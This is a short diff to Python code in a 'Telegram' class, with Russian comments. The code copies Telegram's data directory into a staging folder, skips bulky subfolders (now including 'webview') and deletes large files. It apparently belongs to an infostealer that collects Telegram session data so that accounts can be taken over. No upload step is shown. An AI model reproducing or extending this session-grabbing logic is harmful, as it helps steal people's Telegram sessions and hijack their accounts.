@@ -160,7 +160,7 @@ class Telegram:
 	def telegram():
 		for path in paths_Telegram:
 			try:
-				shutil.copytree(path, tg_path, ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+				shutil.copytree(path, tg_path, ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3", "webview"))
 							# 1) откуда 2) куда 3) что не копировать.     Сама создает директорию, если она уже существует то вызывает ошибку
 				break
 			except: pass
@@ -178,7 +178,7 @@ class Telegram:
 					
 				if Telegram.get_size(f'{tg_path}\\{i}'):
 					os.remove(f'{tg_path}\\{i}')
-					break
+			
 			# удаляем ненужные файлы размером больше 500кб
 			listdir = os.listdir(is_dir)
 			for i in listdir:
